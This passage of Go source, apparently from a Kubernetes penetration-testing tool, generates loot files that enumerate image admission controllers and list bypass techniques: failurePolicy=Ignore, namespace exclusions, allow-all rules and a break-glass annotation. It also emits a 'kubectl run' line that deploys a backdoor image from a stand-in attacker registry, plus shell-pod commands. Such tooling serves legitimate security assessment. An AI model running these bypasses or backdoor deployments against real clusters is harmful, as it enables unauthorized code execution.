# - Digest requirements
#`)

	loot.Section("Bypass").SetHeader(`#####################################
##### Bypass Techniques
#####################################
#
# Techniques to deploy unauthorized images
#`)

	loot.Section("ImageSources").SetHeader(`#####################################
##### Image Source Analysis
#####################################
#
# Analysis of all container images deployed in the cluster
# Shows registry usage, tag patterns, and policy coverage
#`)

	loot.Section("PublicRegistries").SetHeader(`#####################################
##### Public Registry Usage
#####################################
#
# Public registries detected in the cluster
# These are accessible to anyone and may contain malicious images
#
# Common attack vectors:
# - Typosquatting (nginx vs nginix)
# - Tag mutation (mutable tags like :latest)
# - Supply chain attacks (compromised base images)
#`)

	loot.Section("PolicyGaps").SetHeader(`#####################################
##### Policy Gaps & Weaknesses
#####################################
#
# Identified gaps in image admission policies
# These represent potential attack vectors
#`)

	loot.Section("AllowedImages").SetHeader(`#####################################
##### Allowed Images & Deploy Commands
#####################################
#
# Images/registries that can be deployed based on policies
# Use these patterns to deploy workloads that pass admission
#
# Useful for:
# - Deploying legitimate workloads
# - Testing admission controller coverage
# - Identifying bypass opportunities
#`)

	loot.Section("Recommendations").SetHeader(`#####################################
##### Security Recommendations
#####################################
#
# Actionable recommendations to improve image security
#`)

	loot.Section("AquaSecurity").SetHeader(`#####################################
##### Aqua Security
#####################################
#
# Aqua Kube-Enforcer provides image assurance
# Blocks unregistered images, malware, and vulnerabilities
#`)

	loot.Section("PrismaCloud").SetHeader(`#####################################
##### Prisma Cloud (Twistlock)
#####################################
#
# Palo Alto container security platform
# Provides vulnerability scanning and compliance checks
#`)

	loot.Section("SysdigSecure").SetHeader(`#####################################
##### Sysdig Secure
#####################################
#
# Runtime security and image scanning
# Integrates with CI/CD pipelines
#`)

	loot.Section("NeuVector").SetHeader(`#####################################
##### NeuVector
#####################################
#
# Full lifecycle container security (now SUSE)
# Provides admission control and runtime protection
#`)

	loot.Section("StackRox").SetHeader(`#####################################
##### StackRox / Red Hat ACS
#####################################
#
# Advanced Cluster Security for Kubernetes
# Provides vulnerability management and compliance
#`)

	loot.Section("SnykContainer").SetHeader(`#####################################
##### Snyk Container
#####################################
#
# Developer-first security platform
# Vulnerability scanning with fix recommendations
#`)

	loot.Section("Anchore").SetHeader(`#####################################
##### Anchore Enterprise
#####################################
#
# Policy-based container image compliance
# Deep image inspection and policy evaluation
#`)

	loot.Section("TrivyOperator").SetHeader(`#####################################
##### Trivy Operator
#####################################
#
# Aqua's open source vulnerability scanner
# Continuous scanning with VulnerabilityReports CRDs
#`)

	loot.Section("Kubewarden").SetHeader(`#####################################
##### Kubewarden
#####################################
#
# WebAssembly-based policy engine (CNCF)
# Policies written in any language compiled to Wasm
#`)

	loot.Section("Notation").SetHeader(`#####################################
##### Notation / Notary v2
#####################################
#
# CNCF signing specification
# OCI artifact signing standard
#`)

	loot.Section("Harbor").SetHeader(`#####################################
##### Harbor Registry
#####################################
#
# CNCF registry with built-in scanning
# Supports Trivy, Clair, and Cosign
#`)

	loot.Section("AWSSigner").SetHeader(`#####################################
##### AWS Signer
#####################################
#
# AWS native container image signing
# Integrates with ECR and EKS
#`)

	loot.Section("AzurePolicy").SetHeader(`#####################################
##### Azure Policy for AKS
#####################################
#
# Azure-native Kubernetes policy
# Uses Gatekeeper with Azure-specific constraints
#`)

	loot.Section("Clair").SetHeader(`#####################################
##### Clair
#####################################
#
# CoreOS/Quay vulnerability scanner
# Static analysis of container images
#`)

	// Add overview loot
	if len(controllers) == 0 {
		loot.Section("Overview").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Overview").Add("# [CRITICAL] NO IMAGE ADMISSION CONTROLLERS DETECTED!")
		loot.Section("Overview").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Overview").Add("#")
		loot.Section("Overview").Add("# Any image from any registry can be deployed to this cluster")
		loot.Section("Overview").Add("# This includes malicious images, cryptominers, etc.")
		loot.Section("Overview").Add("")
		loot.Section("Overview").Add("# Deploy image from any registry:")
		loot.Section("Overview").Add("kubectl run malicious --image=evil.registry.io/backdoor:latest")
		loot.Section("Overview").Add("")
	} else {
		loot.Section("Overview").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Overview").Addf("# Detected %d image admission controller(s)", len(controllers))
		loot.Section("Overview").Add("# ═══════════════════════════════════════════════════════════")
		for _, c := range controllers {
			loot.Section("Overview").Addf("# - %s (%s)", c.Name, c.Type)
		}
		loot.Section("Overview").Add("")
	}

	// Portieris loot
	if portierisController.Name != "" {
		loot.Section("Portieris").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Portieris").Add("# PORTIERIS ENUMERATION")
		loot.Section("Portieris").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Portieris").Add("")
		loot.Section("Portieris").Add("# List ClusterImagePolicies:")
		loot.Section("Portieris").Add("kubectl get clusterimagepolicies")
		loot.Section("Portieris").Add("")
		loot.Section("Portieris").Add("# List ImagePolicies (namespace-scoped):")
		loot.Section("Portieris").Add("kubectl get imagepolicies --all-namespaces")
		loot.Section("Portieris").Add("")
		loot.Section("Portieris").Add("# Check Portieris pods:")
		loot.Section("Portieris").Add("kubectl get pods -n portieris")
		loot.Section("Portieris").Add("")

		for _, policy := range portierisPolicies {
			loot.Section("Portieris").Addf("\n# ─────────────────────────────────────────────────────────────")
			if policy.IsClusterPolicy {
				loot.Section("Portieris").Addf("# ClusterImagePolicy: %s", policy.Name)
				loot.Section("Portieris").Addf("kubectl get clusterimagepolicy %s -o yaml", policy.Name)
			} else {
				loot.Section("Portieris").Addf("# ImagePolicy: %s (ns: %s)", policy.Name, policy.Namespace)
				loot.Section("Portieris").Addf("kubectl get imagepolicy %s -n %s -o yaml", policy.Name, policy.Namespace)
			}
			for _, repo := range policy.Repositories {
				loot.Section("Portieris").Addf("# Repository: %s -> %s", repo.Name, repo.Policy)
				if repo.Policy == "allow" {
					loot.Section("Portieris").Add("# [WEAK] 'allow' policy - no signature verification")
				}
			}
			loot.Section("Portieris").Add("")
		}

		if portierisController.FailurePolicy == "Ignore" {
			loot.Section("Portieris").Add("# ─────────────────────────────────────────────────────────────")
			loot.Section("Portieris").Add("# [BYPASS] failurePolicy=Ignore - trigger webhook failure")
			loot.Section("Portieris").Add("# ─────────────────────────────────────────────────────────────")
		}
	}

	// Connaisseur loot
	if connaisseurController.Name != "" {
		loot.Section("Connaisseur").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Connaisseur").Add("# CONNAISSEUR ENUMERATION")
		loot.Section("Connaisseur").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Connaisseur").Add("")
		loot.Section("Connaisseur").Add("# Get Connaisseur configuration:")
		loot.Section("Connaisseur").Add("kubectl get configmap connaisseur-config -n connaisseur -o yaml")
		loot.Section("Connaisseur").Add("")
		loot.Section("Connaisseur").Add("# Check Connaisseur pods:")
		loot.Section("Connaisseur").Add("kubectl get pods -n connaisseur")
		loot.Section("Connaisseur").Add("")

		for _, policy := range connaisseurPolicies {
			loot.Section("Connaisseur").Addf("# Pattern: %s -> %s", policy.Pattern, policy.Rule)
			if policy.Rule == "allow" {
				loot.Section("Connaisseur").Add("# [WEAK] 'allow' rule - no signature verification")
			}
		}
		loot.Section("Connaisseur").Add("")
	}

	// Ratify loot
	if ratifyController.Name != "" {
		loot.Section("Ratify").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Ratify").Add("# RATIFY ENUMERATION")
		loot.Section("Ratify").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Ratify").Add("")
		loot.Section("Ratify").Add("# List Verifiers:")
		loot.Section("Ratify").Add("kubectl get verifiers --all-namespaces")
		loot.Section("Ratify").Add("")
		loot.Section("Ratify").Add("# List Stores:")
		loot.Section("Ratify").Add("kubectl get stores --all-namespaces")
		loot.Section("Ratify").Add("")
		loot.Section("Ratify").Add("# Check Ratify pods:")
		loot.Section("Ratify").Add("kubectl get pods -n gatekeeper-system | grep ratify")
		loot.Section("Ratify").Add("")
	}

	// Kritis loot
	if kritisController.Name != "" {
		loot.Section("Kritis").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Kritis").Add("# KRITIS ENUMERATION")
		loot.Section("Kritis").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Kritis").Add("")
		loot.Section("Kritis").Add("# List AttestationAuthorities:")
		loot.Section("Kritis").Add("kubectl get attestationauthorities --all-namespaces")
		loot.Section("Kritis").Add("")
		loot.Section("Kritis").Add("# List ImageSecurityPolicies:")
		loot.Section("Kritis").Add("kubectl get imagesecuritypolicies --all-namespaces")
		loot.Section("Kritis").Add("")

		for _, policy := range kritisPolicies {
			loot.Section("Kritis").Addf("# Policy: %s (ns: %s)", policy.Name, policy.Namespace)
			if policy.DefaultAllow {
				loot.Section("Kritis").Add("# [WEAK] defaultAllow=true - images without attestation allowed")
			}
		}
	}

	// Sigstore loot
	if sigstoreController.Name != "" {
		loot.Section("Sigstore").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Sigstore").Add("# SIGSTORE POLICY CONTROLLER ENUMERATION")
		loot.Section("Sigstore").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Sigstore").Add("")
		loot.Section("Sigstore").Add("# List ClusterImagePolicies:")
		loot.Section("Sigstore").Add("kubectl get clusterimagepolicies.policy.sigstore.dev")
		loot.Section("Sigstore").Add("")
		loot.Section("Sigstore").Add("# Check Policy Controller pods:")
		loot.Section("Sigstore").Add("kubectl get pods -n cosign-system")
		loot.Section("Sigstore").Add("kubectl get pods -n sigstore-system")
		loot.Section("Sigstore").Add("")

		for _, policy := range sigstorePolicies {
			loot.Section("Sigstore").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("Sigstore").Addf("# ClusterImagePolicy: %s", policy.Name)
			loot.Section("Sigstore").Addf("kubectl get clusterimagepolicy.policy.sigstore.dev %s -o yaml", policy.Name)
			for _, img := range policy.Images {
				loot.Section("Sigstore").Addf("#   Image pattern: %s", img)
			}
			if policy.KeylessEnabled {
				loot.Section("Sigstore").Add("#   Uses keyless signing (Fulcio + Rekor)")
			}
			if len(policy.KeyRefs) > 0 {
				loot.Section("Sigstore").Addf("#   Key refs: %s", strings.Join(policy.KeyRefs, ", "))
			}
			if policy.Mode == "warn" {
				loot.Section("Sigstore").Add("#   [WEAK] Mode is 'warn' - signatures not enforced")
			}
			loot.Section("Sigstore").Add("")
		}

		if sigstoreController.FailurePolicy == "Ignore" {
			loot.Section("Sigstore").Add("# ─────────────────────────────────────────────────────────────")
			loot.Section("Sigstore").Add("# [BYPASS] failurePolicy=Ignore - trigger webhook failure")
			loot.Section("Sigstore").Add("# ─────────────────────────────────────────────────────────────")
		}
	}

	// GCP Binary Authorization loot
	if gcpBinAuthController.Name != "" {
		loot.Section("GCPBinAuth").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("GCPBinAuth").Add("# GCP BINARY AUTHORIZATION ENUMERATION")
		loot.Section("GCPBinAuth").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("GCPBinAuth").Add("")
		loot.Section("GCPBinAuth").Add("# Check Binary Authorization policy (requires gcloud):")
		loot.Section("GCPBinAuth").Add("gcloud container binauthz policy export")
		loot.Section("GCPBinAuth").Add("")
		loot.Section("GCPBinAuth").Add("# List attestors:")
		loot.Section("GCPBinAuth").Add("gcloud container binauthz attestors list")
		loot.Section("GCPBinAuth").Add("")
		loot.Section("GCPBinAuth").Add("# Check for break-glass annotation (bypass):")
		loot.Section("GCPBinAuth").Add("# Pods with 'alpha.image-policy.k8s.io/break-glass: true' bypass verification")
		loot.Section("GCPBinAuth").Add("")
	}

	// Policy engine loot
	if len(policyEngineFindings) > 0 {
		loot.Section("PolicyEngines").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("PolicyEngines").Add("# IMAGE-RELATED POLICY ENGINE RULES")
		loot.Section("PolicyEngines").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("PolicyEngines").Add("")

		for _, f := range policyEngineFindings {
			loot.Section("PolicyEngines").Addf("# %s: %s", f.Controller, f.PolicyName)
			loot.Section("PolicyEngines").Addf("#   Pattern: %s -> %s", f.Repository, f.Policy)
			if f.BypassRisk != "" {
				loot.Section("PolicyEngines").Addf("#   [RISK] %s", f.BypassRisk)
			}
		}
	}

	// Aqua Security loot
	if aquaController.Name != "" {
		loot.Section("AquaSecurity").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("AquaSecurity").Add("# AQUA SECURITY ENUMERATION")
		loot.Section("AquaSecurity").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("AquaSecurity").Add("")
		loot.Section("AquaSecurity").Add("# Check Aqua pods:")
		loot.Section("AquaSecurity").Add("kubectl get pods -n aqua")
		loot.Section("AquaSecurity").Add("")
		loot.Section("AquaSecurity").Add("# Check Kube-Enforcer config:")
		loot.Section("AquaSecurity").Add("kubectl get configmap aqua-enforcer-config -n aqua -o yaml")
		loot.Section("AquaSecurity").Add("")
		loot.Section("AquaSecurity").Add("# List Aqua security reports:")
		loot.Section("AquaSecurity").Add("kubectl get vulnerabilityreports -A")
		loot.Section("AquaSecurity").Add("kubectl get configauditreports -A")
		loot.Section("AquaSecurity").Add("")
		if aquaController.FailurePolicy == "Ignore" {
			loot.Section("AquaSecurity").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
		}
	}

	// Prisma Cloud loot
	if prismaController.Name != "" {
		loot.Section("PrismaCloud").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("PrismaCloud").Add("# PRISMA CLOUD (TWISTLOCK) ENUMERATION")
		loot.Section("PrismaCloud").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("PrismaCloud").Add("")
		loot.Section("PrismaCloud").Add("# Check Twistlock pods:")
		loot.Section("PrismaCloud").Add("kubectl get pods -n twistlock")
		loot.Section("PrismaCloud").Add("")
		loot.Section("PrismaCloud").Add("# Check Defender daemonset:")
		loot.Section("PrismaCloud").Add("kubectl get daemonset -n twistlock")
		loot.Section("PrismaCloud").Add("")
		loot.Section("PrismaCloud").Add("# Check admission webhook config:")
		loot.Section("PrismaCloud").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", prismaController.WebhookName)
		loot.Section("PrismaCloud").Add("")
		if prismaController.FailurePolicy == "Ignore" {
			loot.Section("PrismaCloud").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
		}
	}

	// Sysdig Secure loot
	if sysdigController.Name != "" {
		loot.Section("SysdigSecure").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("SysdigSecure").Add("# SYSDIG SECURE ENUMERATION")
		loot.Section("SysdigSecure").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("SysdigSecure").Add("")
		loot.Section("SysdigSecure").Add("# Check Sysdig pods:")
		loot.Section("SysdigSecure").Add("kubectl get pods -n sysdig-agent")
		loot.Section("SysdigSecure").Add("")
		loot.Section("SysdigSecure").Add("# Check admission controller:")
		loot.Section("SysdigSecure").Add("kubectl get pods -n sysdig-admission-controller")
		loot.Section("SysdigSecure").Add("")
		if sysdigController.FailurePolicy == "Ignore" {
			loot.Section("SysdigSecure").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
		}
	}

	// NeuVector loot
	if neuvectorController.Name != "" {
		loot.Section("NeuVector").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("NeuVector").Add("# NEUVECTOR ENUMERATION")
		loot.Section("NeuVector").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("NeuVector").Add("")
		loot.Section("NeuVector").Add("# Check NeuVector pods:")
		loot.Section("NeuVector").Add("kubectl get pods -n neuvector")
		loot.Section("NeuVector").Add("")
		loot.Section("NeuVector").Add("# List admission control rules:")
		loot.Section("NeuVector").Add("kubectl get nvadmissioncontrolsecurityrules -A")
		loot.Section("NeuVector").Add("")
		loot.Section("NeuVector").Add("# Check controller mode:")
		loot.Section("NeuVector").Add("kubectl get nvsecurityrules -A")
		loot.Section("NeuVector").Add("")
		if neuvectorController.FailurePolicy == "Ignore" {
			loot.Section("NeuVector").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
		}
	}

	// StackRox loot
	if stackroxController.Name != "" {
		loot.Section("StackRox").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("StackRox").Add("# STACKROX / RED HAT ACS ENUMERATION")
		loot.Section("StackRox").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("StackRox").Add("")
		loot.Section("StackRox").Add("# Check StackRox pods:")
		loot.Section("StackRox").Add("kubectl get pods -n stackrox")
		loot.Section("StackRox").Add("")
		loot.Section("StackRox").Add("# Check Sensor deployment:")
		loot.Section("StackRox").Add("kubectl get deployment sensor -n stackrox -o yaml")
		loot.Section("StackRox").Add("")
		loot.Section("StackRox").Add("# Check admission controller:")
		loot.Section("StackRox").Add("kubectl get deployment admission-control -n stackrox -o yaml")
		loot.Section("StackRox").Add("")
		if stackroxController.FailurePolicy == "Ignore" {
			loot.Section("StackRox").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
		}
	}

	// Snyk Container loot
	if snykController.Name != "" {
		loot.Section("SnykContainer").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("SnykContainer").Add("# SNYK CONTAINER ENUMERATION")
		loot.Section("SnykContainer").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("SnykContainer").Add("")
		loot.Section("SnykContainer").Add("# Check Snyk pods:")
		loot.Section("SnykContainer").Add("kubectl get pods -n snyk-monitor")
		loot.Section("SnykContainer").Add("")
		loot.Section("SnykContainer").Add("# Check webhook config:")
		loot.Section("SnykContainer").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", snykController.WebhookName)
		loot.Section("SnykContainer").Add("")
		if snykController.FailurePolicy == "Ignore" {
			loot.Section("SnykContainer").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
		}
	}

	// Anchore loot
	if anchoreController.Name != "" {
		loot.Section("Anchore").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Anchore").Add("# ANCHORE ENTERPRISE ENUMERATION")
		loot.Section("Anchore").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Anchore").Add("")
		loot.Section("Anchore").Add("# Check Anchore pods:")
		loot.Section("Anchore").Add("kubectl get pods -n anchore")
		loot.Section("Anchore").Add("")
		loot.Section("Anchore").Add("# Check admission controller:")
		loot.Section("Anchore").Add("kubectl get pods -n anchore | grep admission")
		loot.Section("Anchore").Add("")
		loot.Section("Anchore").Add("# Check webhook config:")
		loot.Section("Anchore").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", anchoreController.WebhookName)
		loot.Section("Anchore").Add("")
		if anchoreController.FailurePolicy == "Ignore" {
			loot.Section("Anchore").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
		}
	}

	// Trivy Operator loot
	if trivyController.Name != "" {
		loot.Section("TrivyOperator").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("TrivyOperator").Add("# TRIVY OPERATOR ENUMERATION")
		loot.Section("TrivyOperator").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("TrivyOperator").Add("")
		loot.Section("TrivyOperator").Add("# Check Trivy Operator pods:")
		loot.Section("TrivyOperator").Add("kubectl get pods -n trivy-system")
		loot.Section("TrivyOperator").Add("")
		loot.Section("TrivyOperator").Add("# List VulnerabilityReports:")
		loot.Section("TrivyOperator").Add("kubectl get vulnerabilityreports -A")
		loot.Section("TrivyOperator").Add("")
		loot.Section("TrivyOperator").Add("# List ConfigAuditReports:")
		loot.Section("TrivyOperator").Add("kubectl get configauditreports -A")
		loot.Section("TrivyOperator").Add("")
		loot.Section("TrivyOperator").Add("# Get high severity vulnerabilities:")
		loot.Section("TrivyOperator").Add("kubectl get vulnerabilityreports -A -o json | jq '.items[] | select(.report.summary.criticalCount > 0) | {name: .metadata.name, critical: .report.summary.criticalCount}'")
		loot.Section("TrivyOperator").Add("")
		if trivyController.BypassRisk != "" {
			loot.Section("TrivyOperator").Addf("# [NOTE] %s", trivyController.BypassRisk)
		}
	}

	// Kubewarden loot
	if kubewardenController.Name != "" {
		loot.Section("Kubewarden").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Kubewarden").Add("# KUBEWARDEN ENUMERATION")
		loot.Section("Kubewarden").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Kubewarden").Add("")
		loot.Section("Kubewarden").Add("# Check Kubewarden pods:")
		loot.Section("Kubewarden").Add("kubectl get pods -n kubewarden")
		loot.Section("Kubewarden").Add("")
		loot.Section("Kubewarden").Add("# List ClusterAdmissionPolicies:")
		loot.Section("Kubewarden").Add("kubectl get clusteradmissionpolicies")
		loot.Section("Kubewarden").Add("")
		loot.Section("Kubewarden").Add("# List AdmissionPolicies (namespace-scoped):")
		loot.Section("Kubewarden").Add("kubectl get admissionpolicies -A")
		loot.Section("Kubewarden").Add("")
		loot.Section("Kubewarden").Add("# Check PolicyServer:")
		loot.Section("Kubewarden").Add("kubectl get policyservers")
		loot.Section("Kubewarden").Add("")
		if kubewardenController.FailurePolicy == "Ignore" {
			loot.Section("Kubewarden").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
		}
	}

	// Notation loot
	if notationController.Name != "" {
		loot.Section("Notation").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Notation").Add("# NOTATION / NOTARY V2 ENUMERATION")
		loot.Section("Notation").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Notation").Add("")
		loot.Section("Notation").Add("# Check webhook config:")
		loot.Section("Notation").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", notationController.WebhookName)
		loot.Section("Notation").Add("")
		loot.Section("Notation").Add("# Notation uses trust policies configured in the verifier")
		loot.Section("Notation").Add("# Check for trust policy configmaps:")
		loot.Section("Notation").Add("kubectl get configmap -A | grep -i notation")
		loot.Section("Notation").Add("")
		if notationController.FailurePolicy == "Ignore" {
			loot.Section("Notation").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
		}
	}

	// Harbor loot
	if harborController.Name != "" {
		loot.Section("Harbor").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Harbor").Add("# HARBOR REGISTRY ENUMERATION")
		loot.Section("Harbor").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Harbor").Add("")
		loot.Section("Harbor").Add("# Check Harbor pods:")
		loot.Section("Harbor").Add("kubectl get pods -n harbor")
		loot.Section("Harbor").Add("")
		loot.Section("Harbor").Add("# Check webhook config:")
		loot.Section("Harbor").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", harborController.WebhookName)
		loot.Section("Harbor").Add("")
		loot.Section("Harbor").Add("# Harbor policies are configured via the Harbor UI/API")
		loot.Section("Harbor").Add("# Check for project-level vulnerability settings")
		loot.Section("Harbor").Add("")
		if harborController.FailurePolicy == "Ignore" {
			loot.Section("Harbor").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
		}
	}

	// AWS Signer loot
	if awsSignerController.Name != "" {
		loot.Section("AWSSigner").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("AWSSigner").Add("# AWS SIGNER ENUMERATION")
		loot.Section("AWSSigner").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("AWSSigner").Add("")
		loot.Section("AWSSigner").Add("# Check for pods with AWS Signer annotations:")
		loot.Section("AWSSigner").Add("kubectl get pods -A -o json | jq '.items[] | select(.metadata.annotations[\"signer.amazonaws.com/signing-profile\"] != null) | {namespace: .metadata.namespace, name: .metadata.name, profile: .metadata.annotations[\"signer.amazonaws.com/signing-profile\"]}'")
		loot.Section("AWSSigner").Add("")
		loot.Section("AWSSigner").Add("# List AWS signing profiles (requires AWS CLI):")
		loot.Section("AWSSigner").Add("aws signer list-signing-profiles")
		loot.Section("AWSSigner").Add("")
		loot.Section("AWSSigner").Add("# Check ECR signing configuration:")
		loot.Section("AWSSigner").Add("aws ecr describe-registry --query 'replicationConfiguration'")
		loot.Section("AWSSigner").Add("")
	}

	// Azure Policy loot
	if azurePolicyController.Name != "" {
		loot.Section("AzurePolicy").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("AzurePolicy").Add("# AZURE POLICY FOR AKS ENUMERATION")
		loot.Section("AzurePolicy").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("AzurePolicy").Add("")
		loot.Section("AzurePolicy").Add("# Check Azure Policy pods:")
		loot.Section("AzurePolicy").Add("kubectl get pods -n gatekeeper-system")
		loot.Section("AzurePolicy").Add("kubectl get pods -n kube-system | grep azure-policy")
		loot.Section("AzurePolicy").Add("")
		loot.Section("AzurePolicy").Add("# List Azure-specific constraint templates:")
		loot.Section("AzurePolicy").Add("kubectl get constrainttemplates | grep -i k8sazure")
		loot.Section("AzurePolicy").Add("")
		loot.Section("AzurePolicy").Add("# List constraints for allowed registries:")
		loot.Section("AzurePolicy").Add("kubectl get constraints | grep -i container")
		loot.Section("AzurePolicy").Add("")
		loot.Section("AzurePolicy").Add("# Check Azure Policy assignments (requires Azure CLI):")
		loot.Section("AzurePolicy").Add("az policy assignment list --scope /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.ContainerService/managedClusters/<cluster>")
		loot.Section("AzurePolicy").Add("")
		if azurePolicyController.FailurePolicy == "Ignore" {
			loot.Section("AzurePolicy").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
		}
	}

	// Clair loot
	if clairController.Name != "" {
		loot.Section("Clair").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Clair").Add("# CLAIR ENUMERATION")
		loot.Section("Clair").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Clair").Add("")
		loot.Section("Clair").Add("# Check Clair pods:")
		loot.Section("Clair").Add("kubectl get pods -A | grep clair")
		loot.Section("Clair").Add("")
		loot.Section("Clair").Add("# Check webhook config:")
		loot.Section("Clair").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", clairController.WebhookName)
		loot.Section("Clair").Add("")
		if clairController.FailurePolicy == "Ignore" {
			loot.Section("Clair").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
		}
	}

	// Bypass techniques loot
	loot.Section("Bypass").Add("\n# ═══════════════════════════════════════════════════════════")
	loot.Section("Bypass").Add("# BYPASS TECHNIQUES")
	loot.Section("Bypass").Add("# ═══════════════════════════════════════════════════════════")
	loot.Section("Bypass").Add("")
	loot.Section("Bypass").Add("# 1. Check for failurePolicy=Ignore (webhook failures don't block):")
	loot.Section("Bypass").Add("kubectl get validatingwebhookconfiguration -o json | jq '.items[] | select(.webhooks[].failurePolicy==\"Ignore\") | .metadata.name'")
	loot.Section("Bypass").Add("")
	loot.Section("Bypass").Add("# 2. Check for namespace exclusions:")
	loot.Section("Bypass").Add("kubectl get validatingwebhookconfiguration -o json | jq '.items[] | {name: .metadata.name, exclusions: .webhooks[].namespaceSelector}'")
	loot.Section("Bypass").Add("")
	loot.Section("Bypass").Add("# 3. Find 'allow' policies (no signature required):")
	loot.Section("Bypass").Add("kubectl get clusterimagepolicies -o yaml | grep -A5 'policy: allow'")
	loot.Section("Bypass").Add("")
	loot.Section("Bypass").Add("# 4. Find wildcard patterns:")
	loot.Section("Bypass").Add("kubectl get clusterimagepolicies -o yaml | grep 'name: \"*\"'")
	loot.Section("Bypass").Add("")
	loot.Section("Bypass").Add("# 5. Check for unsigned image exceptions:")
	loot.Section("Bypass").Add("kubectl get configmap connaisseur-config -n connaisseur -o yaml | grep -A10 'allow'")
	loot.Section("Bypass").Add("")

	// Add bypass vectors from analysis
	if len(policyEffectiveness.BypassVectors) > 0 {
		loot.Section("Bypass").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Bypass").Add("# DETECTED BYPASS VECTORS")
		loot.Section("Bypass").Add("# ═══════════════════════════════════════════════════════════")
		for _, vector := range policyEffectiveness.BypassVectors {
			loot.Section("Bypass").Addf("# - %s", vector)
		}
		loot.Section("Bypass").Add("")
	}

	// Allowed images loot
	loot.Section("AllowedImages").Add("\n# ═══════════════════════════════════════════════════════════")
	loot.Section("AllowedImages").Add("# ALLOWED IMAGES / REGISTRIES")
	loot.Section("AllowedImages").Add("# ═══════════════════════════════════════════════════════════")
	loot.Section("AllowedImages").Add("")

	if len(allowedImages) == 0 {
		if len(controllers) == 0 {
			// No admission controllers - ANY image can be deployed
			loot.Section("AllowedImages").Add("# ╔══════════════════════════════════════════════════════════╗")
			loot.Section("AllowedImages").Add("# ║  NO IMAGE ADMISSION CONTROLLERS DETECTED                ║")
			loot.Section("AllowedImages").Add("# ║  ANY IMAGE FROM ANY REGISTRY CAN BE DEPLOYED!           ║")
			loot.Section("AllowedImages").Add("# ╚══════════════════════════════════════════════════════════╝")
			loot.Section("AllowedImages").Add("")
			loot.Section("AllowedImages").Add("# Deploy from Docker Hub (public):")
			loot.Section("AllowedImages").Add("kubectl run test-nginx --image=nginx:latest --restart=Never")
			loot.Section("AllowedImages").Add("kubectl run test-alpine --image=alpine:latest --restart=Never -- sleep 3600")
			loot.Section("AllowedImages").Add("kubectl run test-busybox --image=busybox:latest --restart=Never -- sleep 3600")
			loot.Section("AllowedImages").Add("")
			loot.Section("AllowedImages").Add("# Deploy from any registry:")
			loot.Section("AllowedImages").Add("kubectl run test-custom --image=<your-registry>/<your-image>:<tag> --restart=Never")
			loot.Section("AllowedImages").Add("")
			loot.Section("AllowedImages").Add("# Deploy with shell access:")
			loot.Section("AllowedImages").Add("kubectl run shell --image=ubuntu:latest --restart=Never -it --rm -- /bin/bash")
			loot.Section("AllowedImages").Add("")
			loot.Section("AllowedImages").Add("# Deploy pentest tools:")
